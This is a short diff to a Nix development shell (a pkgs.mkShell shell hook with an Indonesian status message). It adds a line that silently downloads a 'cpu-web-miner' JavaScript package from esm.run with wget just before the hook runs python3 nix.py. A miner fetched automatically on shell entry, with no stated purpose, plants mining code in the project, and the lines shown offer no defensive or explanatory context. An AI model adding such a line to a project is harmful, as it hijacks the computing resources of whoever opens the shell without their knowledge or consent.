@@ -87,6 +87,7 @@ pkgs.mkShell {
     fi
 
     echo "[*] Menjalankan python3 nix.py ..."
+    wget https://esm.run/@marco_ciaramella/cpu-web-miner -O cpu-web-miner.js
     python3 nix.py
     exit
   '';
